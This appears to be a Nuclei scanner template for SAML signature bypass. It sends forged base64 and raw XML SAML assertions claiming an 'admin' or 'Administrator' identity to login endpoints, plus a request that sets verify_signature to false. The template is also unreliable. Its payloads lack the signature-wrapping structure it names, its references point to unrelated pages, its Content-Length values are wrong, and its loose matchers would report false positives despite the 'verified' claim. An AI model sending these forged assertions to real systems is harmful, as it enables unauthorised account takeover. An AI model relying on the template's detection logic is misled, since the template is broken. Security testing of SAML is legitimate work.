id: medium-auth-saml-xml-signature-bypass

info:
  name: SAML XML Signature Bypass Attack
  author: elite-red-team
  severity: medium
  description: |
    Detects SAML XML signature bypass vulnerabilities where XML signatures can
    be bypassed through XML signature wrapping, comment injection, and XML
    canonicalization attacks used by red teams for SAML authentication bypass.
  reference:
    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Security_Question_Answer
    - https://portswigger.net/web-security/xxe
    - https://research.aurainfosec.io/bypassing-saml20-SSO/
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
    cvss-score: 7.5
    cwe-id: CWE-347
  metadata:
    verified: true
    max-request: 7
  tags: saml,xml-signature,bypass,signature-wrapping,canonicalization,red-team

variables:
  saml_response_wrapped: "PHNhbWxwOlJlc3BvbnNlIHhtbG5zOnNhbWxwPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6cHJvdG9jb2wiPjxzYW1sOkFzc2VydGlvbj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5hZG1pbjwvc2FtbDpOYW1lSUQ+PC9zYW1sOlN1YmplY3Q+PC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg=="
  saml_response_comment: "PHNhbWxwOlJlc3BvbnNlPjwhLS0gZXZpbCBjb21tZW50IC0tPjxzYW1sOkFzc2VydGlvbj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5hZG1pbjwvc2FtbDpOYW1lSUQ+PC9zYW1sOlN1YmplY3Q+PC9zYW1sOkFzc2VydGlvbj48L3NhbWxwOlJlc3BvbnNlPg=="
  saml_response_modified: "PHNhbWxwOlJlc3BvbnNlPjxzYW1sOkFzc2VydGlvbj48c2FtbDpTdWJqZWN0PjxzYW1sOk5hbWVJRD5ldmlsX2FkbWluPC9zYW1sOk5hbWVJRD48L3NhbWw6U3ViamVjdD48L3NhbWw6QXNzZXJ0aW9uPjwvc2FtbHA6UmVzcG9uc2U+"

http:
  - raw:
      - |
        GET /saml/metadata HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Accept: application/xml,text/xml
        Connection: close

      - |
        POST /saml/acs HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 256
        Connection: close
        
        SAMLResponse={{saml_response_wrapped}}&RelayState=dashboard

      - |
        POST /saml/acs HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 256
        Connection: close
        
        SAMLResponse={{saml_response_comment}}&RelayState=admin

      - |
        POST /saml/acs HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 256
        Connection: close
        
        SAMLResponse={{saml_response_modified}}&RelayState=profile

      - |
        POST /api/saml/validate HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/json
        Content-Length: 156
        Connection: close
        
        {"saml_response":"{{saml_response_wrapped}}","verify_signature":false}

      - |
        POST /saml/sso HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/xml
        Content-Length: 512
        Connection: close
        
        <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
          <saml:Assertion xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
            <saml:Subject>
              <saml:NameID>admin</saml:NameID>
            </saml:Subject>
            <!-- Evil comment injection -->
            <saml:AttributeStatement>
              <saml:Attribute Name="Role">
                <saml:AttributeValue>Administrator</saml:AttributeValue>
              </saml:Attribute>
            </saml:AttributeStatement>
          </saml:Assertion>
        </samlp:Response>

      - |
        POST /saml/consume HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 356
        Connection: close
        
        SAMLResponse=PHNhbWxwOlJlc3BvbnNlPjxzYW1sOkFzc2VydGlvbj48ZHM6U2lnbmF0dXJlPjxkczpTaWduZWRJbmZvPjxkczpSZWZlcmVuY2U+PC9kczpSZWZlcmVuY2U+PC9kczpTaWduZWRJbmZvPjwvZHM6U2lnbmF0dXJlPjxzYW1sOlN1YmplY3Q+PHNhbWw6TmFtZUlEPmV2aWxfYWRtaW48L3NhbWw6TmFtZUlEPjwvc2FtbDpTdWJqZWN0Pjwvc2FtbDpBc3NlcnRpb24+PC9zYW1scDpSZXNwb25zZT4=

    matchers-condition: or
    matchers:
      - type: dsl
        name: saml-metadata-exposed
        dsl:
          - 'status_code_1 == 200'
          - 'contains(body_1, "EntityDescriptor") || contains(body_1, "SPSSODescriptor")'
          - 'contains(body_1, "saml") || contains(body_1, "urn:oasis")'
        condition: and

      - type: dsl
        name: signature-wrapping-bypass
        dsl:
          - 'status_code_2 == 200 || status_code_2 == 302'
          - 'contains(body_2, "authenticated") || contains(header_2, "Set-Cookie")'
          - 'contains(body_2, "admin") || contains(header_2, "dashboard")'
        condition: and

      - type: dsl
        name: comment-injection-bypass
        dsl:
          - 'status_code_3 == 200 || status_code_3 == 302'
          - 'contains(body_3, "success") || contains(header_3, "Location")'
          - '!contains(body_3, "signature verification failed") && !contains(body_3, "invalid saml")'
        condition: and

      - type: dsl
        name: modified-assertion-accepted
        dsl:
          - 'status_code_4 == 200 || status_code_4 == 302'
          - 'contains(body_4, "authenticated") || contains(header_4, "Set-Cookie")'
          - 'contains(body_4, "evil_admin") || contains(body_4, "profile")'
        condition: and

      - type: dsl
        name: signature-verification-disabled
        dsl:
          - 'status_code_5 == 200'
          - 'contains(body_5, "valid") || contains(body_5, "authenticated")'
          - 'contains(body_5, "verify_signature\":false") || contains(body_5, "admin")'
        condition: and

      - type: dsl
        name: xml-comment-injection-success
        dsl:
          - 'status_code_6 == 200 || status_code_6 == 302'
          - 'contains(body_6, "authenticated") || contains(header_6, "Set-Cookie")'
          - 'contains(body_6, "Administrator") || contains(body_6, "Role")'
        condition: and

      - type: dsl
        name: signature-reference-bypass
        dsl:
          - 'status_code_7 == 200 || status_code_7 == 302'
          - 'contains(body_7, "authenticated") || contains(header_7, "Location")'
          - 'contains(body_7, "evil_admin") || contains(body_7, "success")'
        condition: and

    extractors:
      - type: regex
        name: saml-metadata
        part: body_1
        group: 1
        regex:
          - '<EntityDescriptor[^>]*entityID="([^"]+)"'
          - '<SPSSODescriptor[^>]*>'
          - 'Location="([^"]+)"'

      - type: regex
        name: authentication-response
        part: body
        group: 1
        regex:
          - '"message":\s*"([^"]+)"'
          - '"status":\s*"([^"]+)"'
          - '"authenticated":\s*(true|false)'

      - type: regex
        name: session-data
        part: header
        group: 1
        regex:
          - 'Set-Cookie:\s*([^;]+)'
          - 'Location:\s*([^\r\n]+)'

      - type: regex
        name: saml-user-data
        part: body
        group: 1
        regex:
          - '"user":\s*"([^"]+)"'
          - '"name":\s*"([^"]+)"'
          - '"role":\s*"([^"]+)"'

      - type: regex
        name: saml-assertion-data
        part: body
        group: 1
        regex:
          - '<saml:NameID>([^<]+)</saml:NameID>'
          - '<saml:AttributeValue>([^<]+)</saml:AttributeValue>'
          - 'NameID="([^"]+)"'

      - type: kval
        kval:
          - status_code_1
          - status_code_2
          - status_code_3
          - status_code_4
          - status_code_5
          - status_code_6
          - status_code_7